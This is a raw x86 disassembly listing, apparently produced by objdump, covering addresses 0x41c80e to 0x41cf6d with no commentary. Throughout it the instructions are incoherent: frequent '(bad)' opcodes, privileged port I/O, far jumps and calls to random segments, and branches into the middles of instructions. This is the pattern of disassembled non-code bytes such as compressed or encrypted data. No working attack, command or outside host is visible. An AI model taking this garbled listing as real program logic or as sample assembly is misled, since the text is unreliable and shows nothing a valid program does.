  41c80e:	call   0xc8439286
  41c813:	mov    esp,0xbe1f7fa8
  41c818:	sbb    BYTE PTR [esi+0x3172f423],cl
  41c81e:	rol    DWORD PTR [esi-0x2f],0x52
  41c822:	jl     0x41c893
  41c824:	dec    esi
  41c825:	push   edi
  41c826:	push   ebx
  41c827:	leave  
  41c828:	fimul  WORD PTR [eax+0x553553e8]
  41c82e:	out    dx,al
  41c82f:	mov    WORD PTR [ebx],cs
  41c831:	cmp    DWORD PTR [ecx],ebx
  41c833:	gs leave 
  41c835:	jo     0x41c800
  41c837:	popf   
  41c838:	clc    
  41c839:	and    BYTE PTR [ecx-0x3e52229f],dl
  41c83f:	btc    DWORD PTR [ebx+0x7c],edx
  41c843:	jmp    0x41c831
  41c845:	mov    al,ds:0x46597265
  41c84a:	fldcw  WORD PTR [ecx]
  41c84c:	mov    ebx,0x30e7a33b
  41c851:	mov    ch,0x7d
  41c853:	sbb    cl,al
  41c855:	adc    BYTE PTR [edx-0x58aebb6c],ah
  41c85b:	add    DWORD PTR [eax],esp
  41c85d:	push   edx
  41c85e:	mov    WORD PTR [esi+0x6a],gs
  41c861:	lock lahf 
  41c863:	(bad)  
  41c864:	lea    ebx,[edi+0x1a208e6b]
  41c86a:	mov    edx,0x33706811
  41c86f:	or     cl,0x75
  41c872:	xor    esi,edx
  41c874:	jmp    0xa17fe4f4
  41c879:	push   ds
  41c87a:	or     esp,DWORD PTR [ebx]
  41c87c:	mov    ebp,DWORD PTR [ebp+0x3ca1b908]
  41c882:	stos   BYTE PTR es:[edi],al
  41c883:	sub    DWORD PTR [esi+0x6e53d6ae],eax
  41c889:	mov    ch,0xb0
  41c88b:	out    0x6f,eax
  41c88d:	imul   ecx,edx,0xe0b19d40
  41c893:	iret   
  41c894:	jecxz  0x41c8e8
  41c896:	out    dx,al
  41c897:	mov    ss,WORD PTR [edx+0x3368e7f7]
  41c89d:	jns    0x41c858
  41c89f:	sbb    DWORD PTR [edi+eax*2+0x282aa6fa],0x2
  41c8a7:	bound  ecx,QWORD PTR [esi]
  41c8a9:	aam    0x7c
  41c8ab:	push   cs
  41c8ac:	dec    esi
  41c8ad:	xor    eax,0xb8c868fe
  41c8b2:	sub    bh,0xc
  41c8b5:	call   0xb299f1d1
  41c8ba:	mov    edi,0x4ce494e6
  41c8bf:	dec    esi
  41c8c0:	leave  
  41c8c1:	inc    esp
  41c8c2:	cli    
  41c8c3:	mov    ecx,0xb79ceada
  41c8c8:	popa   
  41c8c9:	xchg   esi,eax
  41c8ca:	push   cs
  41c8cb:	add    esp,DWORD PTR [ebx+0x43]
  41c8ce:	add    eax,0x6bdf0413
  41c8d3:	cs inc eax
  41c8d5:	dec    eax
  41c8d6:	adc    eax,0xc89c7962
  41c8db:	sub    eax,0x17df32fa
  41c8e0:	outs   dx,BYTE PTR ds:[esi]
  41c8e1:	push   ebp
  41c8e2:	aas    
  41c8e3:	push   0xffffffba
  41c8e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8e6:	test   al,0xbe
  41c8e8:	fdivr  QWORD PTR [ebx]
  41c8ea:	pop    ebx
  41c8eb:	sti    
  41c8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8ed:	(bad)  
  41c8ee:	jns    0x41c90f
  41c8f0:	jecxz  0x41c955
  41c8f2:	pop    esp
  41c8f3:	bound  esi,QWORD PTR [ebp-0x33356950]
  41c8f9:	mov    esp,0xdc1a8e24
  41c8fe:	jle    0x41c93f
  41c900:	xlat   BYTE PTR ds:[ebx]
  41c901:	ror    bl,cl
  41c903:	mov    al,ds:0xb8f1ea2f
  41c908:	cmp    bh,ch
  41c90a:	jns    0x41c916
  41c90c:	cvtpi2ps xmm4,mm0
  41c90f:	push   eax
  41c910:	int3   
  41c911:	pop    esi
  41c912:	pushf  
  41c913:	out    dx,al
  41c914:	test   BYTE PTR [esi],dh
  41c916:	ins    DWORD PTR es:[edi],dx
  41c917:	je     0x41c8e8
  41c919:	loop   0x41c8c0
  41c91b:	ss js  0x41c963
  41c91e:	retf   
  41c91f:	pop    eax
  41c920:	push   ss
  41c921:	cmp    ah,BYTE PTR [edx+0x36]
  41c924:	mov    WORD PTR [edi-0x8],fs
  41c927:	loopne 0x41c8fb
  41c929:	(bad)  
  41c92a:	repz in al,dx
  41c92c:	arpl   WORD PTR [ebp-0x4d],ax
  41c92f:	push   ebp
  41c930:	and    dl,ah
  41c932:	add    al,0x5e
  41c934:	aas    
  41c935:	fimul  DWORD PTR [edx-0x4fff9d8a]
  41c93b:	mov    BYTE PTR [ebp-0x2a825ced],dh
  41c941:	sahf   
  41c942:	mov    esp,0x886481ea
  41c947:	mov    edx,0xabd0c391
  41c94c:	scas   al,BYTE PTR es:[edi]
  41c94d:	cmp    ch,al
  41c94f:	mov    ds:0x140a183f,al
  41c954:	dec    eax
  41c955:	push   0x9d2e00c8
  41c95a:	sbb    al,0xe9
  41c95c:	ja     0x41c96a
  41c95e:	sbb    esp,esp
  41c960:	pop    ebp
  41c961:	test   BYTE PTR [eax-0x2e50ba19],cl
  41c967:	pop    ebx
  41c968:	lods   eax,DWORD PTR ds:[esi]
  41c969:	and    BYTE PTR [edx-0x18],0xb9
  41c96d:	rcr    DWORD PTR [ecx+0x75],cl
  41c970:	jp     0x41c98e
  41c972:	mov    ds:0xc20e7d43,al
  41c977:	inc    eax
  41c978:	aas    
  41c979:	xor    cl,BYTE PTR [eax]
  41c97b:	jb     0x41c93a
  41c97d:	cdq    
  41c97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c97f:	and    al,0x4b
  41c981:	clc    
  41c982:	sahf   
  41c983:	jno    0x41c915
  41c985:	mov    al,0xa4
  41c987:	xchg   ebx,eax
  41c988:	fimul  WORD PTR [ecx+0x32]
  41c98b:	lock lds edx,FWORD PTR [edi+0x2acea015]
  41c992:	int    0x7a
  41c994:	cmp    ebx,ebx
  41c996:	inc    ebp
  41c997:	sub    eax,0x8d50a873
  41c99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c99d:	sbb    esi,DWORD PTR [ebx+ebp*2+0x7f3393c6]
  41c9a4:	xor    esi,DWORD PTR [ecx+0x3]
  41c9a7:	out    0x2b,eax
  41c9a9:	push   ecx
  41c9aa:	scas   eax,DWORD PTR es:[edi]
  41c9ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ac:	dec    ebx
  41c9ad:	pop    ebx
  41c9ae:	xchg   ebp,eax
  41c9af:	dec    ecx
  41c9b0:	push   ds
  41c9b1:	xchg   edx,eax
  41c9b2:	call   0x9dcf:0x916a8d4
  41c9b9:	test   eax,0xa404e63
  41c9be:	jo     0x41c952
  41c9c0:	inc    edx
  41c9c1:	push   eax
  41c9c2:	cmc    
  41c9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c4:	jno    0x41c969
  41c9c6:	xor    eax,0x88df50b5
  41c9cb:	setns  BYTE PTR [ebx+0x97ab366]
  41c9d2:	inc    edx
  41c9d3:	cmovb  ebp,DWORD PTR [ebx+0x70e16612]
  41c9da:	repnz hlt 
  41c9dc:	mov    BYTE PTR [eax],dl
  41c9de:	mov    ?,WORD PTR [edx]
  41c9e0:	add    BYTE PTR [ebx+0xc19983f],bl
  41c9e6:	hlt    
  41c9e7:	adc    al,0xf8
  41c9e9:	mov    edx,0x9416417d
  41c9ee:	xchg   ebp,eax
  41c9ef:	sar    bl,cl
  41c9f1:	addr16 jmp 0x8a0ab121
  41c9f7:	xchg   ecx,eax
  41c9f8:	aaa    
  41c9f9:	push   ds
  41c9fa:	rcr    BYTE PTR [esp+ebp*8-0xceadbb0],1
  41ca01:	adc    dl,BYTE PTR [ebp+0x7f1bc4e5]
  41ca07:	idiv   DWORD PTR [edx]
  41ca09:	push   esi
  41ca0a:	out    dx,eax
  41ca0b:	cmp    al,0x7c
  41ca0d:	xlat   BYTE PTR ds:[ebx]
  41ca0e:	jmp    0x5f97:0xbed22214
  41ca15:	fcom   DWORD PTR [edx+0x7b]
  41ca18:	into   
  41ca19:	mov    cl,0xbc
  41ca1b:	add    al,0x2a
  41ca1d:	je     0x41ca7c
  41ca1f:	cli    
  41ca20:	jp     0x41ca1d
  41ca22:	xchg   esp,eax
  41ca23:	jbe    0x41ca7a
  41ca25:	xlat   BYTE PTR ds:[ebx]
  41ca26:	mov    al,ch
  41ca28:	and    ch,bl
  41ca2a:	call   0x5ec3:0x69df0c07
  41ca31:	push   ebp
  41ca32:	xor    DWORD PTR [esi+ebx*1+0x4d088f02],eax
  41ca39:	push   ss
  41ca3a:	mov    DWORD PTR [eax],eax
  41ca3c:	and    eax,0x35080082
  41ca41:	xchg   esi,eax
  41ca42:	lds    eax,FWORD PTR [ecx+0x57]
  41ca45:	or     al,0x5a
  41ca47:	push   esp
  41ca48:	push   ebp
  41ca49:	rcl    DWORD PTR [edx+eiz*2],1
  41ca4c:	push   esp
  41ca4d:	sub    BYTE PTR [ebp-0x2de1039d],ah
  41ca53:	outs   dx,DWORD PTR ds:[esi]
  41ca54:	outs   dx,BYTE PTR ds:[esi]
  41ca55:	fld    QWORD PTR [esi-0x678a6ba9]
  41ca5b:	fmul   QWORD PTR [ebx-0x35]
  41ca5e:	lds    edi,FWORD PTR [ebx-0xbf4d0b]
  41ca64:	xchg   esi,eax
  41ca65:	mov    gs,WORD PTR [ecx+0x20]
  41ca68:	test   eax,0xaa1ecaa6
  41ca6d:	jbe    0x41ca06
  41ca6f:	sti    
  41ca70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca71:	scas   al,BYTE PTR es:[edi]
  41ca72:	push   ss
  41ca73:	shl    BYTE PTR [ecx+0x4a],0xdb
  41ca77:	inc    edi
  41ca78:	pop    eax
  41ca79:	mov    bh,0xec
  41ca7b:	fisttp DWORD PTR [esi]
  41ca7d:	imul   ecx,DWORD PTR [ebx],0x4d00c990
  41ca83:	sbb    eax,0xbcbf2138
  41ca88:	cmc    
  41ca89:	and    ch,ah
  41ca8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca8c:	int3   
  41ca8d:	jnp    0x41cac8
  41ca8f:	pop    ds
  41ca90:	xchg   DWORD PTR [ebp+esi*2-0x5f1e091],esi
  41ca97:	inc    edx
  41ca98:	popf   
  41ca99:	mov    ds:0x3c53bc97,eax
  41ca9e:	aam    0xa0
  41caa0:	lds    eax,FWORD PTR [edx+0x2]
  41caa3:	sub    al,0x67
  41caa5:	loopne 0x41cac5
  41caa7:	sbb    DWORD PTR [edx-0xf],edi
  41caaa:	jae    0x41caac
  41caac:	inc    esi
  41caad:	(bad)  
  41caaf:	ins    DWORD PTR es:[edi],dx
  41cab0:	pop    ds
  41cab1:	in     eax,dx
  41cab2:	adc    BYTE PTR [eax-0x5d],dh
  41cab5:	in     al,dx
  41cab6:	pop    eax
  41cab7:	adc    ecx,ecx
  41cab9:	(bad)  [esi-0x35e502b8]
  41cabf:	cs push edi
  41cac1:	xor    BYTE PTR [ebp+ebp*1+0x27a80bfc],0xce
  41cac9:	xor    DWORD PTR [ebx],eax
  41cacb:	mov    esp,DWORD PTR [ebx]
  41cacd:	lea    ecx,[ecx]
  41cacf:	dec    edx
  41cad0:	push   ecx
  41cad1:	cli    
  41cad2:	out    dx,al
  41cad3:	mov    eax,0xfcbc820a
  41cad8:	fcomp  DWORD PTR [edi+0x58]
  41cadb:	mov    eax,ds:0x5bde4973
  41cae0:	mov    cs,WORD PTR [edi+0xf]
  41cae3:	cmp    DWORD PTR [ecx],0x724bbd43
  41cae9:	add    DWORD PTR [esi+0x4b],ebx
  41caec:	scas   eax,DWORD PTR es:[edi]
  41caed:	push   es
  41caee:	std    
  41caef:	sub    al,0x5c
  41caf1:	mov    al,ds:0x9ed9ace
  41caf6:	xor    cl,ch
  41caf8:	daa    
  41caf9:	add    BYTE PTR [edi],bl
  41cafb:	fstp   TBYTE PTR [edi+0x7c3c176d]
  41cb01:	test   al,0x89
  41cb03:	and    eax,0xdd1cd66f
  41cb08:	fbld   TBYTE PTR [ecx+0x4192144b]
  41cb0e:	lods   eax,DWORD PTR ds:[esi]
  41cb0f:	dec    ebp
  41cb10:	(bad)  
  41cb12:	push   eax
  41cb13:	sub    DWORD PTR [ebp-0x6bfb9668],edx
  41cb19:	sahf   
  41cb1a:	into   
  41cb1b:	xchg   ecx,eax
  41cb1c:	and    eax,0x21c0785b
  41cb21:	pop    esp
  41cb22:	jnp    0x41cad1
  41cb24:	repnz int3 
  41cb26:	mov    ds:0xd6d15b4f,al
  41cb2b:	sbb    esi,DWORD PTR [ecx+0x744482e1]
  41cb31:	add    edx,esp
  41cb33:	mov    eax,0x9ceb456c
  41cb38:	loope  0x41cacf
  41cb3a:	ret    0xb3fb
  41cb3d:	sub    BYTE PTR [edi+esi*1-0x604417e9],cl
  41cb44:	adc    DWORD PTR [ebx+0x261d4b39],0xffffffb3
  41cb4b:	pop    edx
  41cb4c:	and    eax,0xf70ef83d
  41cb51:	enter  0x7d64,0xd5
  41cb55:	rcl    DWORD PTR [edi+0x6e45bce8],0xb3
  41cb5c:	add    edx,DWORD PTR [esi+eiz*4-0x591fd964]
  41cb63:	mov    esp,0xb87640dc
  41cb68:	aaa    
  41cb69:	add    BYTE PTR [ecx-0x57],ah
  41cb6c:	push   0xffffff91
  41cb6e:	sti    
  41cb6f:	xchg   ecx,eax
  41cb70:	sub    al,0xef
  41cb72:	arpl   WORD PTR [edi],bx
  41cb74:	sbb    eax,edi
  41cb76:	adc    bl,BYTE PTR [ebx+0x9]
  41cb79:	icebp  
  41cb7a:	mov    esi,ebp
  41cb7c:	or     al,0xbf
  41cb7e:	ds call 0x2f00:0x6bca3f74
  41cb86:	sub    dh,bl
  41cb88:	cmp    al,0x93
  41cb8a:	call   FWORD PTR [eax+0x98f3db2]
  41cb90:	xchg   ebp,eax
  41cb91:	repnz loope 0x41cbe5
  41cb94:	adc    ebx,DWORD PTR [esi]
  41cb96:	sub    BYTE PTR [ebx+0x5a9229ce],0x4e
  41cb9d:	mov    al,0x52
  41cb9f:	jnp    0x41cbcb
  41cba1:	cmp    DWORD PTR [edx],ebx
  41cba3:	sbb    cl,BYTE PTR [esi+0x72caded0]
  41cba9:	push   ds
  41cbaa:	jns    0x41cc16
  41cbac:	lock add BYTE PTR [ebx*4+0x6c440322],0xc8
  41cbb5:	lds    esi,FWORD PTR [esi+0x3c]
  41cbb8:	fwait
  41cbb9:	pop    esp
  41cbba:	shl    BYTE PTR [esp+ebx*8],0xe0
  41cbbe:	nop
  41cbbf:	and    al,0xc5
  41cbc1:	clc    
  41cbc2:	cmp    BYTE PTR [edx-0x44],0xe9
  41cbc6:	mov    ebx,0x82ead2ea
  41cbcb:	and    bh,BYTE PTR [edx]
  41cbcd:	xor    DWORD PTR [eax+edx*1-0x6798cbd7],ebp
  41cbd4:	and    cl,dh
  41cbd6:	add    DWORD PTR [ecx+0x0],ecx
  41cbd9:	call   0xeda9c243
  41cbde:	ret    
  41cbdf:	push   0xffffffe7
  41cbe1:	aam    0xf5
  41cbe3:	dec    edi
  41cbe4:	jnp    0x41cc2b
  41cbe6:	sahf   
  41cbe7:	mov    ebx,0x16b12e37
  41cbec:	lods   eax,DWORD PTR ds:[esi]
  41cbed:	lods   al,BYTE PTR ds:[esi]
  41cbee:	mov    cl,0xe5
  41cbf0:	jno    0x41cc58
  41cbf2:	int3   
  41cbf3:	cmp    al,0xce
  41cbf5:	int    0x23
  41cbf7:	ret    0x3fd8
  41cbfa:	xchg   edx,eax
  41cbfb:	in     al,0x80
  41cbfd:	fidiv  WORD PTR [ecx-0x15dd4999]
  41cc03:	or     ch,dh
  41cc05:	div    BYTE PTR [edi]
  41cc07:	dec    ebp
  41cc08:	adc    al,0x86
  41cc0a:	test   al,cl
  41cc0c:	push   edi
  41cc0d:	daa    
  41cc0e:	sbb    DWORD PTR [eax-0x4],ecx
  41cc11:	dec    ecx
  41cc12:	push   esp
  41cc13:	fistp  QWORD PTR [eax-0x8eae945]
  41cc19:	lock xchg ebx,eax
  41cc1b:	rol    DWORD PTR [edi-0x2d],0x5d
  41cc1f:	add    al,0xe1
  41cc21:	dec    esi
  41cc22:	aad    0xfe
  41cc24:	jbe    0x41cc03
  41cc26:	cld    
  41cc27:	mov    ecx,0xc5c97444
  41cc2c:	pop    edi
  41cc2d:	push   esi
  41cc2e:	(bad)
  41cc32:	and    ch,0xd1
  41cc35:	les    edx,FWORD PTR [eax]
  41cc37:	neg    BYTE PTR [edx]
  41cc39:	push   eax
  41cc3a:	dec    ebp
  41cc3b:	(bad)  
  41cc3c:	mov    ds,WORD PTR [esi+0x32]
  41cc3f:	or     eax,0x5c3ab21c
  41cc44:	fiadd  DWORD PTR [ecx+0x239b43ec]
  41cc4a:	jl     0x41cc79
  41cc4c:	imul   ecx,DWORD PTR [esi],0x38
  41cc4f:	das    
  41cc50:	fsubr  st(1),st
  41cc52:	jmp    0x3887:0x4bf575c7
  41cc59:	xchg   ecx,eax
  41cc5a:	enter  0x8f2a,0x78
  41cc5e:	xchg   ecx,eax
  41cc5f:	dec    esp
  41cc60:	mov    bh,0xb9
  41cc62:	addr16 cmp eax,0xa55c60d
  41cc68:	jmp    0x5280ecf5
  41cc6d:	mov    ds:0xd8527886,eax
  41cc72:	xchg   edx,eax
  41cc73:	or     DWORD PTR [ebx+0x19],0xfffffff1
  41cc77:	dec    esi
  41cc78:	cmp    eax,DWORD PTR [ecx-0x52]
  41cc7b:	or     eax,0xe49f2f64
  41cc80:	in     al,0x7f
  41cc82:	add    bh,cl
  41cc84:	xor    ebp,DWORD PTR ds:0x50c11662
  41cc8a:	xchg   edi,eax
  41cc8b:	xor    al,0x68
  41cc8d:	(bad)  
  41cc8e:	xlat   BYTE PTR ds:[ebx]
  41cc8f:	jp     0x41cc24
  41cc91:	add    bl,bh
  41cc93:	in     al,dx
  41cc94:	sbb    ah,ah
  41cc96:	int3   
  41cc97:	fnstcw WORD PTR [ebx-0x7c8c3837]
  41cc9d:	pavgw  mm5,mm4
  41cca0:	int3   
  41cca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cca2:	icebp  
  41cca3:	mov    ds:0x5d0437f0,eax
  41cca8:	ja     0x41cc4d
  41ccaa:	fist   DWORD PTR [esi-0x7f2d598]
  41ccb0:	push   ebp
  41ccb1:	aaa    
  41ccb2:	inc    eax
  41ccb3:	sbb    DWORD PTR [eax],ebp
  41ccb5:	jecxz  0x41cc46
  41ccb7:	mov    ch,0x38
  41ccb9:	idiv   BYTE PTR [ecx-0x7e]
  41ccbc:	call   0xd75ba0aa
  41ccc1:	fs push esp
  41ccc3:	mov    ds:0x5402a4e7,eax
  41ccc8:	push   cs
  41ccc9:	fstp   TBYTE PTR [ebp-0x2b]
  41cccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cccd:	mov    ebp,0xa9a3b550
  41ccd2:	xor    DWORD PTR [ebp-0x7738a647],0xffffff90
  41ccd9:	add    dh,BYTE PTR [edx]
  41ccdb:	jmp    DWORD PTR [ecx]
  41ccdd:	dec    edi
  41ccde:	push   0xfffffffa
  41cce0:	cmp    ebp,DWORD PTR [ebx-0x3f]
  41cce3:	aaa    
  41cce4:	inc    BYTE PTR [eax+0x236a0b9b]
  41ccea:	mov    ds:0x2feb182e,eax
  41ccef:	popa   
  41ccf0:	mov    dl,0xbe
  41ccf2:	and    ch,ch
  41ccf4:	iret   
  41ccf5:	outs   dx,BYTE PTR ds:[esi]
  41ccf6:	adc    al,0x26
  41ccf8:	push   esp
  41ccf9:	repz ss loopne 0x41cd1e
  41ccfd:	inc    edi
  41ccfe:	inc    ecx
  41ccff:	(bad)  
  41cd00:	fsubp  st(3),st
  41cd02:	sbb    edx,DWORD PTR [ebp+0x55]
  41cd05:	mov    eax,0x4b4808e
  41cd0a:	sbb    DWORD PTR [ecx*8+0x78cf6673],eax
  41cd11:	ss dec ebx
  41cd13:	mov    ds:0x680e63e4,al
  41cd18:	pop    edi
  41cd19:	pop    esi
  41cd1a:	xlat   BYTE PTR ds:[ebx]
  41cd1b:	bswap  edx
  41cd1d:	inc    ebx
  41cd1e:	add    eax,0x1cf04502
  41cd23:	push   es
  41cd24:	or     BYTE PTR [edi],al
  41cd26:	arpl   dx,bx
  41cd28:	outs   dx,BYTE PTR ds:[esi]
  41cd29:	leave  
  41cd2a:	mov    edi,0xc07860e3
  41cd2f:	sub    ebx,eax
  41cd31:	shl    BYTE PTR [eax],1
  41cd33:	dec    ecx
  41cd34:	jno    0x41cd11
  41cd36:	(bad)  [esp+eax*2+0x70]
  41cd3a:	les    edi,FWORD PTR [ebx+0x5c]
  41cd3d:	mov    ah,0xbd
  41cd3f:	push   ds
  41cd40:	pop    edi
  41cd41:	xor    esi,DWORD PTR [esp+edx*8]
  41cd44:	cmp    bl,BYTE PTR [eax+0x6a]
  41cd47:	pop    edx
  41cd48:	add    al,0x30
  41cd4a:	clc    
  41cd4b:	pop    eax
  41cd4c:	jp     0x41cd25
  41cd4e:	pop    ebp
  41cd4f:	push   eax
  41cd50:	adc    al,0xbf
  41cd52:	push   0x4c3f9e6e
  41cd57:	test   eax,0x2d276a02
  41cd5c:	shl    BYTE PTR [di],cl
  41cd5f:	cdq    
  41cd60:	in     al,0x8e
  41cd62:	and    al,0x46
  41cd64:	mov    cl,0x22
  41cd66:	(bad)  
  41cd68:	aad    0xa1
  41cd6a:	test   al,0x26
  41cd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd6d:	inc    ebp
  41cd6e:	pop    ss
  41cd6f:	sub    esi,DWORD PTR [ebx-0x4c]
  41cd72:	cs jl  0x41cde5
  41cd75:	pop    ecx
  41cd76:	popf   
  41cd77:	mov    ebp,0x2f32664c
  41cd7c:	ins    DWORD PTR es:[edi],dx
  41cd7d:	cmp    al,BYTE PTR [ecx+0x1df6aecb]
  41cd83:	addr16 leave 
  41cd85:	pop    eax
  41cd86:	loopne 0x41cd11
  41cd88:	nop
  41cd89:	mov    esi,0x48b115ec
  41cd8e:	jmp    0x6807:0x37f2cf4b
  41cd95:	call   0xa6d3:0x3acbfd64
  41cd9c:	es push ss
  41cd9e:	sub    al,0x62
  41cda0:	sub    eax,0xb6004f0e
  41cda5:	mov    esi,0xa9cac3eb
  41cdaa:	mov    al,0x75
  41cdac:	nop
  41cdad:	retf   
  41cdae:	sbb    bh,BYTE PTR [eax+0x2233703e]
  41cdb4:	idiv   DWORD PTR [edx]
  41cdb6:	pop    edi
  41cdb7:	inc    ebp
  41cdb8:	cmp    DWORD PTR [ebx-0x7c],esp
  41cdbb:	jmp    0xe777:0xe4cb59bc
  41cdc2:	or     ah,BYTE PTR [edx]
  41cdc4:	ins    BYTE PTR es:[edi],dx
  41cdc5:	mov    bh,0xd4
  41cdc7:	jo     0x41cd98
  41cdc9:	(bad)  
  41cdca:	jp     0x41cdb3
  41cdcc:	add    BYTE PTR [ebp+0x2ad7e04],cl
  41cdd2:	mov    eax,0x43ae15ec
  41cdd7:	jmp    0x41cdc4
  41cdd9:	imul   ebp,DWORD PTR [ebx+0x56],0x18
  41cddd:	add    eax,0xbe0f3bb9
  41cde2:	jmp    0x8c18:0x19987258
  41cde9:	pop    ebx
  41cdea:	jnp    0x41ce3a
  41cdec:	js     0x41ce10
  41cdee:	mov    esi,0xbb99d796
  41cdf3:	mov    ds:0x516ee72d,eax
  41cdf8:	dec    eax
  41cdf9:	shr    esi,cl
  41cdfb:	inc    ebp
  41cdfc:	ret    
  41cdfd:	test   DWORD PTR [esi+0x48],esp
  41ce00:	pop    ebx
  41ce01:	adc    al,0x8f
  41ce03:	ds jp  0x41ce74
  41ce06:	pop    ss
  41ce07:	adc    eax,0x9509a6f9
  41ce0c:	outs   dx,DWORD PTR ds:[esi]
  41ce0d:	xchg   esi,eax
  41ce0e:	ret    0x2452
  41ce11:	push   edi
  41ce12:	or     esp,ecx
  41ce14:	mov    esi,0xeecd543f
  41ce19:	lahf   
  41ce1a:	(bad)  
  41ce1b:	inc    edx
  41ce1c:	cmc    
  41ce1d:	cmp    al,0x4d
  41ce1f:	push   esp
  41ce20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce21:	pusha  
  41ce22:	jb     0x41ce95
  41ce24:	sub    cl,bl
  41ce26:	iret   
  41ce27:	xor    DWORD PTR [ebx+eax*4],0x9403a2a9
  41ce2e:	sub    ebx,DWORD PTR [eax]
  41ce30:	adc    ebx,edx
  41ce32:	cdq    
  41ce33:	ret    
  41ce34:	fcom   QWORD PTR [eax]
  41ce36:	mul    DWORD PTR [esi]
  41ce38:	mov    BYTE PTR [edi+0x5171c335],bl
  41ce3e:	mov    es,WORD PTR [ebx-0x21d0acae]
  41ce44:	ficomp WORD PTR [ebx]
  41ce46:	or     eax,0x60cc0f5f
  41ce4b:	lea    ebp,[ebx+0x45]
  41ce4e:	adc    ebx,esp
  41ce50:	mov    bh,0xde
  41ce52:	out    0x77,eax
  41ce54:	into   
  41ce55:	or     ebx,DWORD PTR [eax+0x4]
  41ce58:	ins    BYTE PTR es:[edi],dx
  41ce59:	psllw  mm0,QWORD PTR fs:[esi-0x7b851928]
  41ce61:	std    
  41ce62:	daa    
  41ce63:	dec    ebx
  41ce64:	mov    ebp,0x4ba5113e
  41ce69:	stos   DWORD PTR es:[edi],eax
  41ce6a:	or     bh,BYTE PTR [edi-0x54]
  41ce6d:	aam    0x6b
  41ce6f:	scas   al,BYTE PTR es:[edi]
  41ce70:	repnz push edi
  41ce72:	stos   BYTE PTR es:[edi],al
  41ce73:	out    0xcc,al
  41ce75:	sub    edi,DWORD PTR [esi+0x21752ef8]
  41ce7b:	push   ds
  41ce7c:	mov    al,ds:0xa87b56d0
  41ce81:	out    dx,eax
  41ce82:	mov    DWORD PTR [eax-0x30],ecx
  41ce85:	sar    BYTE PTR [edx+0x5d],1
  41ce88:	ss sub al,0x3b
  41ce8b:	cdq    
  41ce8c:	fcmovbe st,st(0)
  41ce8e:	jmp    0xd7ac3435
  41ce93:	retf   0xb62f
  41ce96:	push   edi
  41ce97:	imul   dx,WORD PTR [esi],0xe528
  41ce9c:	shl    DWORD PTR [ecx],0x5e
  41ce9f:	nop    DWORD PTR [eax-0x80]
  41cea3:	mov    edx,0xa35c02e8
  41cea8:	xor    eax,0x1770d676
  41cead:	xor    bh,BYTE PTR [ebx-0x4]
  41ceb0:	ret    0xe89d
  41ceb3:	jae    0x41ce9e
  41ceb5:	fs inc ebx
  41ceb7:	xor    DWORD PTR [ebx-0xa],edi
  41ceba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebb:	jno    0x41cef5
  41cebd:	or     ecx,0xffffff94
  41cec0:	pop    esi
  41cec1:	fs fs stos DWORD PTR es:[edi],eax
  41cec4:	ja     0x41ceb3
  41cec6:	push   ecx
  41cec7:	retf   
  41cec8:	loope  0x41cf34
  41ceca:	sub    ecx,DWORD PTR [edx-0x16]
  41cecd:	mov    dh,0xc5
  41cecf:	pop    edi
  41ced0:	(bad)  
  41ced1:	ins    BYTE PTR es:[edi],dx
  41ced2:	(bad)  
  41ced3:	jl     0x41ceeb
  41ced5:	out    dx,eax
  41ced6:	cld    
  41ced7:	lods   al,BYTE PTR ds:[esi]
  41ced8:	cmp    eax,0x16e47af
  41cedd:	and    BYTE PTR [ecx],dl
  41cedf:	sub    al,0xb7
  41cee1:	push   edi
  41cee2:	pop    edi
  41cee3:	inc    ecx
  41cee4:	sahf   
  41cee5:	jo     0x41cf29
  41cee7:	cmp    edx,DWORD PTR [edi-0x34]
  41ceea:	fistp  QWORD PTR [esi+0x4c]
  41ceed:	add    BYTE PTR [esi+0x37],ah
  41cef0:	or     edi,DWORD PTR [eax-0x225157fa]
  41cef6:	shl    BYTE PTR [eax-0x36],1
  41cef9:	inc    esp
  41cefa:	mov    WORD PTR [edx+0x79821139],?
  41cf00:	rcl    DWORD PTR [ebx-0x41],0x57
  41cf04:	das    
  41cf05:	sbb    DWORD PTR [edi],eax
  41cf07:	push   cs
  41cf08:	mov    ebp,0xc2c28dea
  41cf0d:	lahf   
  41cf0e:	adc    cl,BYTE PTR [edi-0x4beaafdc]
  41cf14:	aam    0x66
  41cf16:	jnp    0x41cf8d
  41cf18:	push   es
  41cf19:	outs   dx,BYTE PTR ds:[esi]
  41cf1a:	loopne 0x41cf3f
  41cf1c:	rcr    BYTE PTR [ecx],1
  41cf1e:	push   ebp
  41cf1f:	adc    DWORD PTR [edx+0x2402c40c],edi
  41cf25:	mov    bl,bh
  41cf27:	imul   ebx,DWORD PTR [ebp-0x5561b518],0x9aa13bbc
  41cf31:	adc    eax,0xf2e1bc4d
  41cf36:	jnp    0x41cf5a
  41cf38:	sahf   
  41cf39:	xlat   BYTE PTR ds:[ebx]
  41cf3a:	mov    dh,0xc7
  41cf3c:	(bad)  
  41cf3d:	lahf   
  41cf3e:	sub    eax,0x9b154a80
  41cf43:	push   ebx
  41cf44:	mov    dl,0x7d
  41cf46:	test   al,0xbd
  41cf48:	mov    es,WORD PTR [eax+0x33b10608]
  41cf4e:	jo     0x41cf2e
  41cf50:	pop    ecx
  41cf51:	pop    edx
  41cf52:	jmp    0x41cfc0
  41cf54:	ret    0x96b1
  41cf57:	jl     0x41cfd7
  41cf59:	out    dx,eax
  41cf5a:	(bad)  
  41cf5b:	sbb    edx,DWORD PTR [esi+0x58]
  41cf5e:	sbb    eax,0xcf1ef981
  41cf63:	push   edi
  41cf64:	popf   
  41cf65:	popa   
  41cf66:	add    ebx,DWORD PTR [eax+ebp*4+0x2c704a7f]
  41cf6d:	adc    al,0x91
